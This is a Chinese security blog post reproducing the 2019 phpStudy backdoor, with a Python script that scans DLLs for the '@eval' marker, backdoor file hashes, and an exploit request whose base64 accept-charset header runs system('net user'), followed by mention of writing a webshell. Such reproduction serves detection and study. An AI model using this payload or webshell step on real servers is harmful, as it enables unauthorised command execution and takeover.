<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>phpstudy后门RCE复现 - Guko's Blog</title><meta name="description" content="事件背景Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接安装使用，具有PHP环境调试和PHP开发功能，在国内有着近百万PHP语言学习者、开发者用户9月20日"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">phpstudy后门RCE复现</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">phpstudy后门RCE复现</h1><div class="post-meta">2019-09-24<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><h4 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h4><p>Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接安装使用，具有PHP环境调试和PHP开发功能，在国内有着近百万PHP语言学习者、开发者用户</p>
<a id="more"></a>

<p>9月20日杭州公安微信公众账号发布了“杭州警方通报打击涉网违法犯罪暨“净网2019”专项行动战果”的文章，文章里说明phpstudy存在“后门”</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>软件作者声明phpstudy 2016版PHP5.4存在后门。</p>
<p>实际测试官网下载phpstudy2018版php-5.2.17和php-5.4.45也同样存在后门</p>
<h4 id="后门检测方法"><a href="#后门检测方法" class="headerlink" title="后门检测方法"></a>后门检测方法</h4><p>通过分析，后门代码存在于\ext\php_xmlrpc.dll模块中<br>phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45<br>phpStudy2016路径<br>php\php-5.2.17\ext\php_xmlrpc.dll<br>php\php-5.4.45\ext\php_xmlrpc.dll<br>phpStudy2018路径<br>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll<br>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dl</p>
<p>用记事本打开此文件查找@eval,文件存在@eval(%s(‘%s’)),确认存在漏洞</p>
<p><img src="/2019/09/24/phpstudy后门RCE复现/1.png" alt></p>
<p>python脚本检测程序如下：<br><img src="/2019/09/24/phpstudy后门RCE复现/2.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">#__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">#__blog__=&apos;http://pcat.cc&apos;</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def strings(file) :</span><br><span class="line">    chars = string.printable[:94]</span><br><span class="line">    shortestReturnChar = 4</span><br><span class="line">    regExp = &apos;[%s]&#123;%d,&#125;&apos; % (chars, shortestReturnChar)</span><br><span class="line">    pattern = re.compile(regExp)</span><br><span class="line">    with open(file, &apos;rb&apos;) as f:</span><br><span class="line">        return pattern.findall(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def grep(lines,pattern):</span><br><span class="line">    for line in lines:</span><br><span class="line">        if pattern in line:</span><br><span class="line">            yield line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pcheck(filename):</span><br><span class="line">    # trojan feature</span><br><span class="line">    trojan=&apos;@eval&apos;</span><br><span class="line">    # just check dll file</span><br><span class="line">    if filename.endswith(&apos;.dll&apos;):        </span><br><span class="line">        lines=strings(filename)</span><br><span class="line">        try:</span><br><span class="line">            grep(lines,trojan).next()</span><br><span class="line">        except:</span><br><span class="line">            return</span><br><span class="line">        print &apos;=== &#123;0&#125; ===&apos;.format(filename)</span><br><span class="line">        for line in grep(lines,trojan):</span><br><span class="line">            print line</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    # . stand for current directory</span><br><span class="line">    for path, dirs, files in os.walk(&quot;.&quot;, topdown=False):</span><br><span class="line">        for name in files:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">        for name in dirs:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    foo()</span><br></pre></td></tr></table></figure>

<p>附后门文件MD5值：</p>
<p>MD5: 0F7AD38E7A9857523DFBCE4BCE43A9E9<br>MD5: C339482FD2B233FB0A555B629C0EA5D5</p>
<h4 id="RCE复现"><a href="#RCE复现" class="headerlink" title="RCE复现"></a>RCE复现</h4><p>将含有后门的phpstudy运行起来，php-5.2.17、php-5.4.45都存在漏洞，这里我们选择php-5.2.17，然后访问网站</p>
<p><img src="/2019/09/24/phpstudy后门RCE复现/3.png" alt></p>
<p><img src="/2019/09/24/phpstudy后门RCE复现/4.png" alt></p>
<p>通过bp抓取访问包，修改请求包内容，直接触发远程命令执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Sec-Fetch-Site: none,</span><br><span class="line">accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>

<p><img src="/2019/09/24/phpstudy后门RCE复现/5.png" alt></p>
<p>这里的字段c3lzdGVtKCduZXQgdXNlcicpOw==是经过base64编码的system(‘net user’);</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==</span><br></pre></td></tr></table></figure>

<p>既然能执行命令了就可以写shell了，把一句话经过base64编码后，直接写入,然后中国蚁剑连接即可</p>
<p><img src="/2019/09/24/phpstudy后门RCE复现/6.png" alt></p>
<p><img src="/2019/09/24/phpstudy后门RCE复现/7.png" alt></p>
<p>参考链接</p>
<p><a href="https://secquan.org/Discuss/1070323" target="_blank" rel="noopener">phpstudy后门rce批量利用脚本</a></p>
<p><a href="https://blog.csdn.net/qq_41770175/article/details/101277851" target="_blank" rel="noopener">Phpstudy隐藏后门</a></p>
</div><!--文章标签--><div class="tags"><a href="/tags/命令执行/">命令执行</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 15px;">远程代码执行</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 15px;">PowerShell</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/免杀/" style="font-size: 18px;">免杀</a> <a href="/tags/metasploit/" style="font-size: 18px;">metasploit</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/域信息收集/" style="font-size: 15px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/内网信息收集二/">内网信息收集二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/30/内网信息收集一/">内网信息收集一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/18/PowerShell-Empire/">PowerShell-Empire</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/17/免杀初探-Veil/">免杀初探-Veil</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/13/PowerShell基础/">PowerShell基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/免杀初探-msf自免杀/">免杀初探-msf自免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/07/免杀初探/">免杀初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/06/利用msfvenom生成木马/">利用msfvenom生成木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/05/搭建域环境/">搭建域环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/03/Ngrok-MSF/">Ngrok&MSF</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
  if($(".highlight").length != 0){
    var pc_width = $(".post-content").width();
    $(".highlight .code").find("pre").width((pc_width-70)+"px");
  }
}
window.onresize = function(){
  auto_code_fit();
}
auto_code_fit();</script></div></body>